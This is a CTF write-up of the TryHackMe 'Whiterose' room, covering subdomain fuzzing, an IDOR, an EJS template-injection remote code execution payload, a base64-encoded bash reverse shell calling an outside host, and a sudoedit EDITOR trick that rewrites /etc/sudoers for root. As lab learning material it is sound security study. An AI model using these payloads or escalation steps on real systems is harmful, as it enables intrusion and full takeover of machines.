---
title: "THM - Whiterose"
date: 2025-02-02
image: /assets/images/whiterose/whiterose.png
tas: [tryhackme, writeups, linux, ffuf, sudoedit, burp-suite]
categories: [TryHackMe, Writeup, CTF, Easy]
redirect_from: /2025/02/02/whiterose/
---

Hi,

This is my writeup about the [TryHackMe](https://tryhackme.com) easy room ["Whiterose"](https://tryhackme.com/r/room/whiterose).

## Enumeration

We already got credentials in the task description:

```
Olivia Cortez:olivi8
```
{: .nolineno}

So, we have the key, but not the door. I started as always if the target is not specified.

With a nmap scan:

```shell
nmap -Pn -F $target -oN ports
```
{: .nolineno}

There are two ports open and I checked both with `nmap -sC -sV` but the software running on this server has no known vulnerability.
![nmap services light](/assets/images/whiterose/light/portscan.png){: .light }
![nmap services dark](/assets/images/whiterose/dark/portscan.png){: .dark }

The webserver is trying to redirect to `cyprusbank.thm`, so lets add this fqdn to our `/etc/hosts` file.

### Website

![login page light](/assets/images/whiterose/light/mainsite.png){: .light }
![login page dark](/assets/images/whiterose/dark/mainsite.png){: .dark }

On the website there was nothing useful to find. As we have a FQDN I start a search for subdomains with [ffuf](https://github.com/ffuf/ffuf).
```bash
ffuf -u http://cyprusbank.thm/ -H "Host:FUZZ.cyprusbank.thm" -w /usr/share/seclists/Discovery/DNS/subdomains_top1million-110000.txt -c -v -fs 57
```
{: .nolineno}
I used the `-fs 57` to filter responses with the size of 57, because of the amount of false positives which have this size.
![login page light](/assets/images/whiterose/light/ffuf.png){: .light }
![login page dark](/assets/images/whiterose/dark/ffuf.png){: .dark }

Only one subdomain was found, the `admin` subdomain. The next step will be to add the `admin.cyprusbank.thm` with the same target IP to the `/etc/hosts` file and visit the page.

### Admin Page

![login page light](/assets/images/whiterose/light/adminlogin.png){: .light }
![login page dark](/assets/images/whiterose/dark/adminlogin.png){: .dark }

To login I used the already provided credentials from the task description.
There are four menu entries:
- `Home`:
  Which shows accounts (not all) and the status of this imaginary bank
- `Search`:
  To search for accounts and it lists all accounts if the search input is empty
  ![login page light](/assets/images/whiterose/light/phonemasked.png){: .light }
  ![login page dark](/assets/images/whiterose/dark/phonemasked.png){: .dark }
- `Settings`: Shows only that we have no permissions
  ![login page light](/assets/images/whiterose/light/nopermission.png){: .light }
  ![login page dark](/assets/images/whiterose/dark/nopermission.png){: .dark }
- `Messages`: Which shows us five messages

There is no hint that the messages are readed from someone (simulated ofc) so XXE would make no sense. I looked into the source code of that menu entry.
But there was nothing useful in the page source code for each menu entry. Looking around and testing out, what requests are made and responses coming back, I discovered the parameter in the url for the messages entry:
![login page light](/assets/images/whiterose/light/inspector.png){: .light }
![login page dark](/assets/images/whiterose/dark/inspector.png){: .dark }
The first thing that comes to mind, is to check for a [Insecure Direct Object Reference](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)(IDOR).
Because there where five messages and the number five was the current parameter value, I decided to increase the number.
With each step a new message appears until number nine.
![login page light](/assets/images/whiterose/light/gaylebev.png){: .light }
![login page dark](/assets/images/whiterose/dark/gaylebev.png){: .dark }
Yes! Another username and password to to login.
After using this credentials to login, the phone numbers are visible now. Answer the frist question and continue.
The Settings menu is now available and it shows a page with two input-fields to change the password of an user. I give it a try and changed the password of `Gayle Bav`, but it this dosen't work.
But there have to be something about this page, as it is restricted to some users. There must be a reason for that.

I fired up Burp Suite and take a closer look to the request and response when changing a password.
After playing around for a half hour or more and also begin to doubt that this is the way in, I have accidentally send the request without the `password` parameter.
I was trying to see if there will be some kind of error if sending malformed parameters and yes, the response shows a traceback error message:
![login page light](/assets/images/whiterose/light/ejs.png){: .light }
![login page dark](/assets/images/whiterose/dark/ejs.png){: .dark }
This `ejs` stands for embedded javascript. When searching for "settings.ejs vulnerability" the [first github link](https://github.com/mde/ejs/issues/735) shows a possible exploit!
The PoC of the GitHub user [wh0amitz](https://github.com/wh0amitz) looks like this:
```
?name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('calc');
```
{: .nolineno}

But instead of `calc` I choose a better fit for out context and executed the `ls` command:

![login page light](/assets/images/whiterose/light/ejsls.png){: .light }
![login page dark](/assets/images/whiterose/dark/ejsls.png){: .dark }

Yes! We are able to execute commands!
By executing the `id` command, it shows that we are executing those commands as `web` user.

## Reverse Shell

The next step was to get a reverse shell from that. And ye, you could retriev the user flag from this point on, but I decided to wait for it.

Just for fun.

Now, the reverse shell will be a simple bash reverse shell command.
To create reverse shells, there is a website named [Reverse Shell Generator](https://www.revshells.com/) which supports any executable and language to create revshells and also support encoding of the command.
But when I put in the command as it is, it will not run. Maybe because of some escaping error in the string itself.
Good that the website support encoding the command. But even URL Encoding doesen't solve the problem.

Another try will be to send base64. This could be a solution, but the `execSync` function will not decode it back to a string and execute the code for us, we have to decode it on the target itself and run it afterwards.
Should be easy when using shell oneliner:
```shell
bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzAgMD4mMQ==| base64 -d | bash"
```
{: .nolineno}

This command will execute `echo` which will print the base64 encoded command, but this will be piped to the `base64` command, which decode it and then the decoded string will be piped to the `bash` command, which will run the string.
For me this doesn't work at first, because instead of `sh` I decided to use `bash` to run the reverse shell. When using `sh` it works as expected.
Just to be sure, I choose the absolute path `/bin/bash` instead of just `bash`, this will create a connection but stop it immediately.
So back to `sh` then.

Now we have a shell on the target as user `web`. By this time I answered the second question.

> To stabilize the shell do the following, this will save your nerves later. Trust me.
> 1. export TERM=xterm
> 2. python3 -c 'import pty;pty.spawn("/bin/bash")'
> 3. CTRL+Z (press keys, this is not a command)
> 4. stty raw -echo; fg
> 5. reset
{: .prompt-tip}

## Root it

When I land on a linux machine and want to check privilege escalation possibility, the first thing I do is `sudo -l`.
And it was just the right thing to do, as it shows us that the user `web` can run sudo without the need of a password,
but only for the following command entered 1:1 unchanged:
```bash
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
{: .nolineno}

This is the first time I hear of `sudoedit`. Even that I was used to use ArchLinux as my Desktop and still using it on all my servers, I never came across this command.
Time to investigate what this command does. And ye, I already checked [GTFOBins](https://gtfobins.github.io), but there was nothing about the `sudoedit` command.

When facing a command for the first time, it is a good idea to read the [man page](https://man7.org/linux/man-pages/man8/sudoedit.8.html) for that command.
So, the manual say that this command opens files as another user to edit them. I could have guessed it by it's name.
If I run the command with sudo, it opens the file with `nano`, a texteditor which only exist for non-Vim natives to be able to install archlinux, I guess.
Lucky for me, that I like `vim`/`vi`/`neovim` more than `nano` and the first thing I would do, is to change the editor. Because of this impulses, my though was "How do `sudoedit` decide which editor to use?"

If you ever have installed archlinux then you also have faced the problem, when you forget to install `sudo` on it and when want to do so, you have to use [`visudo`](https://wiki.archlinux.org/title/Sudo#Using_visudo) to enable sudo right for your local user.

Why is this so relevant for this case you may ask. Now, when using `visudo`, you can specify the editor by passing an environment varibale `EDITOR=`.
And on the MAN page of the `sudoedit` command, it says that it uses the very same environment variable to select the editor:

![login page light](/assets/images/whiterose/light/sudoeditman.png){: .light }
![login page dark](/assets/images/whiterose/dark/sudoeditman.png){: .dark }

For clarification:

The `sudoedit` is not `sudo $EDITOR <file>`. `sudoedit` instead copies the target file to a temporary location, and the file is open with the user `web` in our case, not as root.
After closing the texteditor, `sudoedit` moves the file to it's original place and overwrite the old file with root privileges.
Knowing that, it will be useless to run some kind of `export EDITOR='vim -c "!/bin/bash"'` shell spawn commands, as they will be run with the rights of the local user.

To gain root, we have to modify a file which give us root right. I have the freedom here to choose to change `passwd`/`shadow` file or the most simpliest way: change `sudoers` file.

Now, we are only allowed to open `admin.cyprusbank.thm` file with sudoedit, which will rewrite it as root afterwards. To bypass this and be able to decide which file we want to edit, vim has a feature which prevent vim from treatening the following as arguments.

```bash
export EDITOR='vim -- /etc/sudoers'
```
After this export, I ran the sudo command 1:1, but it opens the `sudoers` file instead.

![login page light](/assets/images/whiterose/light/sudoers.png){: .light }
![login page dark](/assets/images/whiterose/dark/sudoers.png){: .dark }

This modification allows the `web` user to run every command without the need of a password with `sudo`.
To switch to root, just do `sudo su`.

Now, with root access, the last flag can be obtained.

Good luck! :)

---

![dark mode only](/assets/images/darksoulsMeme.png){: width="972" height="589" }
